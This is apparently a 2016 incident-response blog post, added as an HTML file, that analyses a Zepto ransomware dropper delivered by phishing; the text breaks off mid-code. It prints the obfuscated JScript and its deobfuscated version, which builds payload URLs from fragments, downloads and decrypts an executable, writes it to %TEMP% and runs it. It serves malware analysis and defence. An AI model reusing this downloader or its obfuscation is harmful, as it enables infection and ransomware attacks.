@@ -1,0 +1,1366 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="Adrian">
+<meta name="description"
+    content="It&amp;rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
+First thing&amp;rsquo;s first, I need to find all the users actively encrypting files on this share." />
+<meta name="keywords" content="blog,security,research,vulnerabilities,cve,malware,reverse engineering,malware analysis" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://bittherapy.net/post/a-look-at-zepto-ransomware-payload-delivery-analysis/" />
+
+
+<title>
+    
+    A Look at Zepto Ransomware - Payload Delivery Analysis :: { bit.therapy } 
+    
+</title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://bittherapy.net/main.min.7bfbbe12786fa0ded4b4c0d792cbb36a5bd0bdb0b856dde57aa7b1f6fe0f2b87.css">
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://bittherapy.net/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://bittherapy.net/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://bittherapy.net/favicon-16x16.png">
+<link rel="manifest" href="https://bittherapy.net/site.webmanifest">
+<link rel="mask-icon" href="https://bittherapy.net/safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="https://bittherapy.net/favicon.ico">
+<meta name="theme-color" content="#252627"><meta itemprop="name" content="A Look at Zepto Ransomware - Payload Delivery Analysis">
+<meta itemprop="description" content="It&rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
+First thing&rsquo;s first, I need to find all the users actively encrypting files on this share.">
+
+
+<meta itemprop="datePublished" content="2016-08-16T12:36:51&#43;00:00" />
+<meta itemprop="dateModified" content="2016-08-16T12:36:51&#43;00:00" />
+<meta itemprop="wordCount" content="5257">
+
+
+
+<meta itemprop="keywords" content="Malware,Reverse Engineering,Malware Analysis,Zepto,Ransomware," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://bittherapy.net"/>
+
+<meta name="twitter:title" content="A Look at Zepto Ransomware - Payload Delivery Analysis"/>
+<meta name="twitter:description" content="It&rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
+First thing&rsquo;s first, I need to find all the users actively encrypting files on this share."/>
+
+
+
+<meta property="article:section" content="Malware" />
+<meta property="article:section" content="Reverse Engineering" />
+<meta property="article:section" content="Malware Analysis" />
+<meta property="article:section" content="Zepto" />
+<meta property="article:section" content="Ransomware" />
+
+<meta property="article:published_time" content="2016-08-16 12:36:51 &#43;0000 UTC" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://bittherapy.net/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">{ bit.therapy }</span>
+            <span class="logo__cursor"></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://bittherapy.net/post/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://bittherapy.net/post/a-look-at-zepto-ransomware-payload-delivery-analysis/">A Look at Zepto Ransomware - Payload Delivery Analysis</a></h2>
+
+            
+
+            <div class="post-content">
+                
+
+<p>It&rsquo;s another quiet Friday when we are alerted of bunch of files with the <code>.zepto</code> extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.</p>
+
+<p>First thing&rsquo;s first, I need to find all the users actively encrypting files on this share.</p>
+
+<p>Zepto creates a help file in all of the directories it attacks. They&rsquo;re usually prefixed with a number, ie: <code>\_45\_HELP_instructions.html</code>.</p>
+
+<p>It&rsquo;s a pretty unique signature and looking at the <code>owner</code> property in the ACL I can find potentially infected users:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; dir \\network\share\*_HELP_instructions.html -recurse | %{ (get-acl $_.fullname).owner | select -unique
+</code></pre>
+
+<p>OK, great. The next step was to grab a sample of this ransomware and figure out what the C2 servers are so we can block them. If it can&rsquo;t get a key from C2, it won&rsquo;t begin encrypting.</p>
+
+<p>We managed to trace the attack vector to a javascript file zipped and attached to a phishing email.</p>
+
+<p>Contents of <code>business card 5a0fae48-.js</code>:</p>
+
+<pre><code class="language-javascript">wsh = WScript[&quot;CreateObject&quot;](&quot;WScript.Shell&quot;);
+se = wsh[&quot;Environment&quot;](&quot;SYSTEM&quot;);
+os = se(&quot;OS&quot;);
+if (os != &quot;Windows_NT&quot;) {
+    WScript[&quot;Quit&quot;](0);
+};
+this[&quot;WScript&quot;][&quot;Sleep&quot;](1);
+
+var aDSu3 = (1, 2, 3, ['\x77\x73\x68\x20\x3d', '\x20\x57\x53\x63\x72', '\x69\x70\x74\x5b\x22', '\x43\x72\x65\x61\x74', '\x65\x4f\x62\x6a\x65', '\x63\x74\x22\x5d\x28', '\x22\x57\x53\x63\x72', '\x69\x70\x74\x2e\x53', 
+... // more hex
+'\x4b\x6a\x29\x5d\x28', '\x29\x3b\x0d\x0a\x7d', '\x3b']);
+eval(aDSu3.join(''));
+</code></pre>
+
+<p>The first couple of lines are self-explanatory. A simple check against the <code>%OS%</code> environment variable to see if it is a known operating system (Windows 2000 -&gt; Windows 10) just before a whole bunch of hex encoded data.</p>
+
+<p>If we replace the <code>eval()</code> at the end with a <code>WScript.Echo()</code> we can see the contents of <code>aDSu3</code> and pipe them into a separate file for analysis:</p>
+
+<pre><code class="language-nix">C:\temp&gt;cscript &quot;business card 5a0fae48-.js&quot; &gt; zepto.js
+</code></pre>
+
+<p>&hellip;and what we get is this mess:</p>
+
+<pre><code class="language-javascript">wsh = WScript[&quot;CreateObject&quot;](&quot;WScript.Shell&quot;);
+se = wsh[&quot;Environment&quot;](&quot;SYSTEM&quot;);
+os = se(&quot;OS&quot;);
+if (os != &quot;Windows_NT&quot;) {
+    WScript[&quot;Quit&quot;](0);
+};
+this[&quot;WScript&quot;][&quot;Sleep&quot;](1);
+
+var XQs = &quot;close&quot; + &quot;&quot;;
+var WFg = &quot;File&quot; + &quot;&quot;;
+var MTo = &quot;To&quot; + &quot;&quot;;
+var AXu7 = &quot;Save&quot; + &quot;&quot;;
+var NTs8 = &quot;t&quot; + &quot;&quot;;
+var DGz = &quot;ex&quot; + &quot;&quot;;
+var NSy = &quot;eT&quot; + &quot;&quot;;
+var BEs = &quot;writ&quot; + &quot;&quot;;
+var Hg0 = &quot;n&quot; + &quot;&quot;;
+var WQg = &quot;ope&quot; + &quot;&quot;;
+var Vv = &quot;set&quot; + &quot;&quot;;
+var VYl = &quot;Char&quot; + &quot;&quot;;
+var Wg3 = &quot;e&quot; + &quot;&quot;;
+var VMd = &quot;typ&quot; + &quot;&quot;;
+var Vf = &quot;am&quot; + &quot;&quot;;
+var VXy = &quot;re&quot; + &quot;&quot;;
+var HOi9 = &quot;DB.St&quot; + &quot;&quot;;
+var Bx3 = &quot;O&quot; + &quot;&quot;;
+var Bc = &quot;D&quot; + &quot;&quot;;
+var XJo5 = &quot;A&quot; + &quot;&quot;;
+var Ob = &quot;t&quot; + &quot;&quot;;
+var WWp = &quot;bjec&quot; + &quot;&quot;;
+var Cv1 = &quot;eateO&quot; + &quot;&quot;;
+var Fp = &quot;Cr&quot; + &quot;&quot;;
+var In4 = &quot;in&quot; + &quot;&quot;;
+var Lu = &quot;jo&quot; + &quot;&quot;;
+
+function LJy(Oz8) {
+    return Oz8;
+};
+var XTw = &quot;Code&quot; + &quot;&quot;;
+var CJj4 = &quot;mChar&quot; + &quot;&quot;;
+var Wt3 = &quot;fro&quot; + &quot;&quot;;
+var JHm = &quot;th&quot; + &quot;&quot;;
+var XLk8 = &quot;ng&quot; + &quot;&quot;;
+var Hd5 = &quot;le&quot; + &quot;&quot;;
+var TUo = &quot;sh&quot; + &quot;&quot;;
+var NVi6 = &quot;pu&quot; + &quot;&quot;;
+var Dx5 = &quot;t&quot; + &quot;&quot;;
+var Hs = &quot;eA&quot; + &quot;&quot;;
+var Cv7 = &quot;arCod&quot; + &quot;&quot;;
+var DDy6 = &quot;ch&quot; + &quot;&quot;;
+var GUu = &quot;h&quot; + &quot;&quot;;
+var KPq4 = &quot;lengt&quot; + &quot;&quot;;
+var XQg1 = &quot;e&quot; + &quot;&quot;;
+var QLf = &quot;clos&quot; + &quot;&quot;;
+
+function UEs(APo0) {
+    return APo0;
+};
+var Uo1 = &quot;Text&quot; + &quot;&quot;;
+var IId = &quot;Read&quot; + &quot;&quot;;
+var MIa = &quot;le&quot; + &quot;&quot;;
+var Be9 = &quot;mFi&quot; + &quot;&quot;;
+var GDx3 = &quot;ro&quot; + &quot;&quot;;
+var ZXj = &quot;LoadF&quot; + &quot;&quot;;
+var Fd9 = &quot;n&quot; + &quot;&quot;;
+var KWs = &quot;ope&quot; + &quot;&quot;;
+var ITb = &quot;set&quot; + &quot;&quot;;
+var Zn = &quot;Char&quot; + &quot;&quot;;
+var WXs9 = &quot;type&quot; + &quot;&quot;;
+var BUr = &quot;am&quot; + &quot;&quot;;
+var Zk0 = &quot;Stre&quot; + &quot;&quot;;
+var NCe3 = &quot;DB.&quot; + &quot;&quot;;
+var Xb = &quot;O&quot; + &quot;&quot;;
+var Xu7 = &quot;D&quot; + &quot;&quot;;
+var UMq = &quot;A&quot; + &quot;&quot;;
+var Ek7 = &quot;ject&quot; + &quot;&quot;;
+var Yu1 = &quot;ateOb&quot; + &quot;&quot;;
+var YNx6 = &quot;Cre&quot; + &quot;&quot;;
+var Bg6 = &quot;h&quot; + &quot;&quot;;
+var QOe = &quot;lengt&quot; + &quot;&quot;;
+var CMh9 = &quot;gth&quot; + &quot;&quot;;
+var JLt = &quot;len&quot; + &quot;&quot;;
+var FUv4 = &quot;ice&quot; + &quot;&quot;;
+var LHp2 = &quot;spl&quot; + &quot;&quot;;
+var AYr6 = &quot;gth&quot; + &quot;&quot;;
+var ZZe = &quot;len&quot; + &quot;&quot;;
+var Ep = &quot;h&quot; + &quot;&quot;;
+var Ul = &quot;ngt&quot; + &quot;&quot;;
+var Yo3 = &quot;le&quot; + &quot;&quot;;
+var Sc1 = &quot;h&quot; + &quot;&quot;;
+var Pu2 = &quot;ngt&quot; + &quot;&quot;;
+var Mx4 = &quot;le&quot; + &quot;&quot;;
+var BRr1 = &quot;th&quot; + &quot;&quot;;
+var Fa = &quot;leng&quot; + &quot;&quot;;
+var WXz = &quot;gth&quot; + &quot;&quot;;
+var Wq = &quot;len&quot; + &quot;&quot;;
+var Xh4 = &quot;eep&quot; + &quot;&quot;;
+var CYa = &quot;Sl&quot; + &quot;&quot;;
+var GAb = &quot; 323&quot; + &quot;&quot;;
+var Va0 = &quot;n&quot; + &quot;&quot;;
+var DOo2 = &quot;Ru&quot; + &quot;&quot;;
+var KIy6 = &quot;gth&quot; + &quot;&quot;;
+var ARv = &quot;len&quot; + &quot;&quot;;
+var PDt = &quot;th&quot; + &quot;&quot;;
+var SYy8 = &quot;ng&quot; + &quot;&quot;;
+var Bg4 = &quot;le&quot; + &quot;&quot;;
+
+function Kj0(Zk) {
+    return Zk;
+};
+var Kj = &quot;e&quot; + &quot;&quot;;
+var Mn = &quot;clos&quot; + &quot;&quot;;
+
+function MLx(JAu) {
+    return JAu;
+};
+
+function Ds(PAj9) {
+    return PAj9;
+};
+var GDa1 = &quot;ile&quot; + &quot;&quot;;
+var ANb8 = &quot;veToF&quot; + &quot;&quot;;
+var GKj = &quot;Sa&quot; + &quot;&quot;;
+var Rs = &quot;n&quot; + &quot;&quot;;
+var CNo5 = &quot;io&quot; + &quot;&quot;;
+var IPy = &quot;posit&quot; + &quot;&quot;;
+
+function Pv3(Cg0) {
+    return Cg0;
+};
+var Qh = &quot;Body&quot; + &quot;&quot;;
+var JOg = &quot;se&quot; + &quot;&quot;;
+var Mj5 = &quot;spon&quot; + &quot;&quot;;
+var Co = &quot;Re&quot; + &quot;&quot;;
+var Qw = &quot;e&quot; + &quot;&quot;;
+var Ir = &quot;writ&quot; + &quot;&quot;;
+var Tp = &quot;type&quot; + &quot;&quot;;
+var Fq = &quot;open&quot; + &quot;&quot;;
+var Dj0 = &quot;am&quot; + &quot;&quot;;
+var Ym = &quot;re&quot; + &quot;&quot;;
+var PTq = &quot;.St&quot; + &quot;&quot;;
+var Kp9 = &quot;DB&quot; + &quot;&quot;;
+
+function WMi(DDv) {
+    return DDv;
+};
+
+function LUt5(XSk) {
+    return XSk;
+};
+var RVm = &quot;O&quot; + &quot;&quot;;
+var NWu9 = &quot;D&quot; + &quot;&quot;;
+var Lh = &quot;A&quot; + &quot;&quot;;
+var DQq = &quot;t&quot; + &quot;&quot;;
+var Dz = &quot;bjec&quot; + &quot;&quot;;
+var Gb7 = &quot;eO&quot; + &quot;&quot;;
+var DZx6 = &quot;Creat&quot; + &quot;&quot;;
+
+function Ny6(Lx2) {
+    return Lx2;
+};
+var KSx = &quot;p&quot; + &quot;&quot;;
+var WZw = &quot;ee&quot; + &quot;&quot;;
+var AUt = &quot;Sl&quot; + &quot;&quot;;
+var AAd1 = &quot;send&quot; + &quot;&quot;;
+var Nz3 = &quot;th&quot; + &quot;&quot;;
+var Vx = &quot;leng&quot; + &quot;&quot;;
+var Np = &quot;GET&quot; + &quot;&quot;;
+var Oy1 = &quot;open&quot; + &quot;&quot;;
+var Fb8 = &quot;gth&quot; + &quot;&quot;;
+var Kk2 = &quot;len&quot; + &quot;&quot;;
+var LSq4 = &quot;ct&quot; + &quot;&quot;;
+var HAp = &quot;eObje&quot; + &quot;&quot;;
+var Gg = &quot;at&quot; + &quot;&quot;;
+var YPc = &quot;Cre&quot; + &quot;&quot;;
+var CBx5 = &quot;h&quot; + &quot;&quot;;
+var Pt = &quot;lengt&quot; + &quot;&quot;;
+var VJu = &quot;5.1&quot; + &quot;&quot;;
+var FXo = &quot;uest.&quot; + &quot;&quot;;
+var DAn2 = &quot;Req&quot; + &quot;&quot;;
+var ABx = &quot;nHttp&quot; + &quot;&quot;;
+var DQo = &quot;.Wi&quot; + &quot;&quot;;
+var BFi = &quot;ttp&quot; + &quot;&quot;;
+var Nn0 = &quot;WinH&quot; + &quot;&quot;;
+
+function Rd(Lq1) {
+    return Lq1;
+};
+var Kh = &quot;P&quot; + &quot;&quot;;
+var QYx4 = &quot;LHTT&quot; + &quot;&quot;;
+var YMa2 = &quot;L2.XM&quot; + &quot;&quot;;
+var Lm6 = &quot;MSXM&quot; + &quot;&quot;;
+var EDd = &quot;/&quot; + &quot;&quot;;
+var UXu0 = &quot;9+&quot; + &quot;&quot;;
+var VDv5 = &quot;5678&quot; + &quot;&quot;;
+var Eq1 = &quot;34&quot; + &quot;&quot;;
+var AId5 = &quot;012&quot; + &quot;&quot;;
+var DQe = &quot;vwxyz&quot; + &quot;&quot;;
+var Ao4 = &quot;qrstu&quot; + &quot;&quot;;
+var OMi0 = &quot;op&quot; + &quot;&quot;;
+var NLq = &quot;mn&quot; + &quot;&quot;;
+var XGx = &quot;ijkl&quot; + &quot;&quot;;
+var Xz = &quot;efgh&quot; + &quot;&quot;;
+var GRb = &quot;abcd&quot; + &quot;&quot;;
+var Vd8 = &quot;XYZ&quot; + &quot;&quot;;
+var TBb0 = &quot;TUVW&quot; + &quot;&quot;;
+var DFe5 = &quot;PQRS&quot; + &quot;&quot;;
+var Nq0 = &quot;NO&quot; + &quot;&quot;;
+var Sz9 = &quot;JKLM&quot; + &quot;&quot;;
+var Yu8 = &quot;HI&quot; + &quot;&quot;;
+var OJe1 = &quot;EFG&quot; + &quot;&quot;;
+var Mb = &quot;ABCD&quot; + &quot;&quot;;
+var Li0 = &quot;xe&quot; + &quot;&quot;;
+var Ty = &quot;.e&quot; + &quot;&quot;;
+var ZLu = &quot;l&quot; + &quot;&quot;;
+var IZr = &quot;Jarn&quot; + &quot;&quot;;
+var FAt8 = &quot;MIHW&quot; + &quot;&quot;;
+var Tm1 = &quot;7eJ4X&quot; + &quot;&quot;;
+var KTx = &quot;/&quot; + &quot;&quot;;
+var LPi2 = &quot;P%&quot; + &quot;&quot;;
+var Pm0 = &quot;%TEM&quot; + &quot;&quot;;
+var Sf1 = &quot;l&quot; + &quot;&quot;;
+var ESo8 = &quot;.Shel&quot; + &quot;&quot;;
+var LQg = &quot;ript&quot; + &quot;&quot;;
+var HGm1 = &quot;WSc&quot; + &quot;&quot;;
+
+function Ai(LWd) {
+    return LWd;
+};
+var Mf = &quot;ect&quot; + &quot;&quot;;
+var XIa = &quot;teObj&quot; + &quot;&quot;;
+var Tp5 = &quot;Crea&quot; + &quot;&quot;;
+var Qq = &quot;3tg&quot; + &quot;&quot;;
+var Oi = &quot;m/0a&quot; + &quot;&quot;;
+var Tu = &quot;co&quot; + &quot;&quot;;
+var AUi = &quot;inoz.&quot; + &quot;&quot;;
+var Tp7 = &quot;dj&quot; + &quot;&quot;;
+var Vg7 = &quot;ol&quot; + &quot;&quot;;
+var BUu7 = &quot;g&quot; + &quot;&quot;;
+var Je = &quot;//&quot; + &quot;&quot;;
+var Fs = &quot;tp:&quot; + &quot;&quot;;
+var Jc = &quot;ht&quot; + &quot;&quot;;
+
+function Xf0(Xm8) {
+    return Xm8;
+};
+var ZDn = &quot;5&quot; + &quot;&quot;;
+var YDg7 = &quot;0y&quot; + &quot;&quot;;
+var VBg = &quot;22&quot; + &quot;&quot;;
+
+function XAg(Oz0) {
+    return Oz0;
+};
+var REi3 = &quot;048&quot; + &quot;&quot;;
+var XTn = &quot;om/&quot; + &quot;&quot;;
+var Vx3 = &quot;.c&quot; + &quot;&quot;;
+var BJf = &quot;h&quot; + &quot;&quot;;
+var Cd = &quot;ec&quot; + &quot;&quot;;
+var IYq0 = &quot;gasm&quot; + &quot;&quot;;
+
+function Kc4(Nu) {
+    return Nu;
+};
+var EDr2 = &quot;cape&quot; + &quot;&quot;;
+var Kp0 = &quot;es&quot; + &quot;&quot;;
+var WEf6 = &quot;//&quot; + &quot;&quot;;
+var Xz7 = &quot;:&quot; + &quot;&quot;;
+var AZc = &quot;http&quot; + &quot;&quot;;
+var GBr2 = &quot;ij7&quot; + &quot;&quot;;
+var Cn = &quot;k&quot; + &quot;&quot;;
+var FOl7 = &quot;4y&quot; + &quot;&quot;;
+var SJa = &quot;2c&quot; + &quot;&quot;;
+var Ai2 = &quot;.in/&quot; + &quot;&quot;;
+var PVu = &quot;re&quot; + &quot;&quot;;
+var Ur8 = &quot;ot&quot; + &quot;&quot;;
+var CKe = &quot;lt&quot; + &quot;&quot;;
+
+function DVq(Wk) {
+    return Wk;
+};
+var Za2 = &quot;ave&quot; + &quot;&quot;;
+var Hj = &quot;r&quot; + &quot;&quot;;
+var Au = &quot;/t&quot; + &quot;&quot;;
+var IJk = &quot;:/&quot; + &quot;&quot;;
+var As = &quot;p&quot; + &quot;&quot;;
+var TAk = &quot;htt&quot; + &quot;&quot;;
+var EMo = &quot;9lu&quot; + &quot;&quot;;
+var LHl8 = &quot;qvvu&quot; + &quot;&quot;;
+
+function MWj(Vh) {
+    return Vh;
+};
+var Gn4 = &quot;s/1&quot; + &quot;&quot;;
+var SLq = &quot;.w&quot; + &quot;&quot;;
+var OHi6 = &quot;t&quot; + &quot;&quot;;
+var Uo = &quot;wer&quot; + &quot;&quot;;
+var OKa6 = &quot;te&quot; + &quot;&quot;;
+
+function Tv(KFg2) {
+    return KFg2;
+};
+var HRp = &quot;ra&quot; + &quot;&quot;;
+var PKu = &quot;ne&quot; + &quot;&quot;;
+var Rf = &quot;ge&quot; + &quot;&quot;;
+var Ne = &quot;e&quot; + &quot;&quot;;
+var Pz = &quot;://r&quot; + &quot;&quot;;
+var AGa6 = &quot;tp&quot; + &quot;&quot;;
+var Sm7 = &quot;ht&quot; + &quot;&quot;;
+var Lj = &quot;7&quot; + &quot;&quot;;
+var Rq = &quot;43&quot; + &quot;&quot;;
+var OIe = &quot;ngth&quot; + &quot;&quot;;
+var DFt2 = &quot;le&quot; + &quot;&quot;;
+
+function GRo(Zz) {
+    return Zz;
+};
+var ZKx6 = &quot;ff&quot; + &quot;&quot;;
+var NGo5 = &quot;ff&quot; + &quot;&quot;;
+
+function Ho(Ra) {
+    return Ra;
+};
+
+function Lx3(EFj7) {
+    return EFj7;
+};
+var HJx = &quot;fd&quot; + &quot;&quot;;
+var HKx4 = &quot;sdfas&quot; + &quot;&quot;;
+var KWe1 = &quot;asfa&quot; + &quot;&quot;;
+var Zh4 = &quot;th&quot; + &quot;&quot;;
+var VVz = &quot;ng&quot; + &quot;&quot;;
+var ZOt = &quot;le&quot; + &quot;&quot;;
+var OSe3 = &quot;f&quot; + &quot;&quot;;
+var Ak = &quot;fff&quot; + &quot;&quot;;
+var UEq = &quot;fff&quot; + &quot;&quot;;
+var VFz1 = &quot;fffff&quot; + &quot;&quot;;
+var Gd = &quot;fffff&quot; + &quot;&quot;;
+var Md7 = &quot;ff&quot; + &quot;&quot;;
+
+function KHx(IOu) {
+    return IOu;
+};
+
+function Av(Jh3) {
+    return Jh3;
+};
+
+function VSq(IUy1) {
+    return IUy1;
+};
+
+function Fr(RQo3) {
+    return RQo3;
+};
+
+function UEi9(Wm7) {
+    return Wm7;
+};
+
+function Ph(Yd) {
+    return Yd;
+};
+
+function DFe(JNy) {
+    return JNy;
+};
+var Zx5 = &quot;th&quot; + &quot;&quot;;
+var Gp = &quot;leng&quot; + &quot;&quot;;
+var JTz9 = &quot;ff&quot; + &quot;&quot;;
+var KQg = &quot;2&quot; + &quot;&quot;;
+var Iv = &quot;313&quot; + &quot;&quot;;
+var CEw = &quot;112&quot; + &quot;&quot;;
+var QAl8 = ((function Pi6() {
+    return CEw;
+}()) + Iv + KQg, (function EAt7() {
+    return JTz9;
+}()));
+var WBe = QAl8[Gp + Zx5];
+var OPr3 = ((function PAj0() {
+    return Md7;
+}()) + Gd + VFz1 + UEq + Ak + OSe3);
+var Em = 587363;
+var Uv = OPr3[KHx(Gp) + Zx5];
+var Zm6 = (Ho(KWe1) + HKx4 + Lx3(HJx), GRo(NGo5) + (function Tq6() {
+    return ZKx6;
+}()));
+var AJf = Zm6[(function Va() {
+    return Gp;
+}()) + Zx5];
+
+var Io = 1;
+var IDz0 = -8358 + 8360;
+var Vu = 2;
+var CJf2 = &quot;437&quot;;
+
+var Lj4 = [Sm7 + (function QPy() {
+    return AGa6;
+}()) + Pz + Ne + Rf + PKu + Tv(HRp) + OKa6 + Uo + OHi6 + MWj(SLq) + Gn4 + LHl8 + EMo, (function HRm5() {
+    return TAk;
+}()) + As + IJk + Au + Hj + DVq(Za2) + CKe + Ur8 + PVu + Ai2 + SJa + FOl7 + Cn + GBr2, AZc + Xz7 + WEf6 + Kp0 + Kc4(EDr2) + IYq0 + Cd + BJf + Vx3 + XTn + XAg(REi3) + VBg + Xf0(YDg7) + ZDn, AZc + Xz7 + Je + BUu7 + Vg7 + Tp7 + AUi + Tu + Oi + Qq];
+var JEc3 = WScript[Tp5 + XIa + Mf](HGm1 + LQg + (function Vc9() {
+    return ESo8;
+}()) + Sf1);
+var Vi5 = JEc3.ExpandEnvironmentStrings(Pm0 + LPi2 + KTx);
+var El = Vi5 + Tm1 + (function CJx3() {
+    return FAt8;
+}()) + IZr + ZLu;
+var Uw = El + Ty + Li0;
+
+function uheprng(UFn4) {
+    return (function() {
+        var seed = UFn4;
+        var o = 48,
+            c = 1 * 1,
+            p = o,
+            s = new Array(o);
+        var i, j;
+        var base64chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;
+        var mash = Mash();
+        for (i = 0; i &lt; o; i++) s[i] = mash(seed);
+        mash = null;
+        var random = function(range) {
+            return Math.floor(range * (rawprng() + (rawprng() * 0x200000 | 0) * 1.1102230246251565e-16));
+        }
+
+        function rawprng() {
+            if (++p &gt;= o) p = 0;
+            var t = (1759680 + 9183) * s[p] + c * 2.3283064365386963e-10;
+            return s[p] = t - (c = t | (-900 + 900));
+        }
+        return random;
+    }());
+};
+
+function Mash() {
+    var n = 0xefc8249d;
+    var mash = function(data) {
+        if (data) {
+            data = data.toString();
+            for (var i = 0; i &lt; data.length; i++) {
+                n += data.charCodeAt(i);
+                var h = 0.02519603282416938 * n;
+                n = h &gt;&gt;&gt; 0;
+                h -= n;
+                h *= n;
+                n = h &gt;&gt;&gt; 0;
+                h -= n;
+                n += h * 0x100000000;
+            }
+            return (n &gt;&gt;&gt; 0) * 2.3283064365386963e-10;
+        } else n = 0xefc8249d;
+    };
+    return mash;
+}
+
+var Yz = [(function OQa() {
+    return Lm6;
+}()) + Rd(YMa2) + QYx4 + Kh, Nn0 + BFi + DQo + ABx + (function Cl1() {
+    return DAn2;
+}()) + FXo + VJu];
+
+for (var IBx3 = 1 * 0; IBx3 &lt; Yz[Gp + Zx5]; IBx3++) {
+    try {
+        var IGv7 = WScript[Tp5 + Ai(XIa) + Mf](Yz[IBx3]);
+        break;
+    } catch (e) {
+        continue;
+    }
+};
+
+var TIk = uheprng(Math.random().toString());
+var Lp9 = 1;
+do {
+    var Gr = TIk(Lj4[(function Cg() {
+        return Gp;
+    }()) + Zx5]);
+    try {
+        if ((1 * 1) == Lp9) {
+            IGv7[Oy1](Np, Lj4[Gr++ % Lj4[Gp + Zx5]], false);
+            IGv7[AAd1]();
+        }
+
+        if (IGv7.readystate &lt; 4) {
+            WScript[AUt + WZw + KSx](-2450 + 2550);
+            continue;
+        }
+
+        var ENa6 = WScript[Tp5 + XIa + Mf](Lh + NWu9 + WMi(RVm) + Kp9 + PTq + Ym + Dj0);
+        ENa6[Oy1]();
+        ENa6[Tp] = Io;
+        ENa6[Ir + Qw](IGv7[Co + Pv3(Mj5) + JOg + (function Hm() {
+            return Qh;
+        }())]);
+        ENa6[IPy + CNo5 + Rs] = 0;
+        ENa6[MLx(GKj) + ANb8 + GDa1](El, Vu);
+        ENa6[Mn + Kj]();
+
+        var DAb4 = HIi(El);
+        DAb4 = Kx1(DAb4);
+        if (DAb4[Gp + Zx5] &lt; 100 * 1024 || DAb4[Gp + Av(Zx5)] &gt; 230 * 1024 || !XHw6(DAb4)) {
+            Lp9 = 1;
+            continue;
+        }
+        try {
+            OMb(Uw, DAb4);
+        } catch (e) {
+            break;
+        };
+
+        JEc3[DOo2 + Va0](Uw + (function FLv2() {
+            return GAb;
+        }()));
+        break;
+    } catch (e) {
+        WScript[Ny6(AUt) + (function Em1() {
+            return WZw;
+        }()) + (function MPr8() {
+            return KSx;
+        }())](1000);
+        continue;
+    };
+} while (Lp9);
+
+WScript.Quit(0);
+
+function Kx1(Nq) {
+    var Nf;
+
+    var NQf6 = uheprng(Em);
+    for (var IBx3 = 1 * 0; IBx3 &lt; Nq[Gp + VSq(Zx5)]; IBx3++) {
+        Nq[IBx3] ^= NQf6(256);
+    }
+
+    var XWe = Nq[Nq[Gp + Zx5] - 4] | Nq[Nq[Gp + Fr(Zx5)] - 3] &lt;&lt; 8 | Nq[Nq[Gp + (function SGz() {
+        return Zx5;
+    }())] - 2] &lt;&lt; 16 | Nq[Nq[Gp + UEi9(Zx5)] - 1] &lt;&lt; 24;
+    Nq[LHp2 + FUv4](DAb4[Ph(Gp) + (function XZh() {
+        return Zx5;
+    }())] - 4, 4);
+
+    Nf = WBe;
+    for (var IBx3 = 0; IBx3 &lt; Nq[DFe(Gp) + Zx5]; IBx3++) {
+        Nf = (Nf + Nq[IBx3]) % 0x100000000;
+    };
+    if (Nf != XWe) {
+        return [];
+    };
+
+    return Nq;
+};
+
+
+function XHw6(Nq) {
+    if (Nq[0] == 0x4D &amp;&amp; Nq[1 * 1] == 0x5a) {
+        return true;
+    } else {
+        return false;
+    }
+};
+
+
+function HIi(GLq) {
+    var Fm = WScript[Tp5 + XIa + Mf](Lh + (function SKa9() {
+        return NWu9;
+    }()) + RVm + Kp9 + PTq + (function Gb() {
+        return Ym;
+    }()) + Dj0);
+    Fm[Tp] = IDz0;
+    Fm[Zn + ITb] = CJf2 /* n  */ ;
+    Fm[Oy1]();
+    Fm[ZXj + GDx3 + Be9 + MIa](GLq);
+    var Nt5 = Fm[IId + UEs(Uo1)];
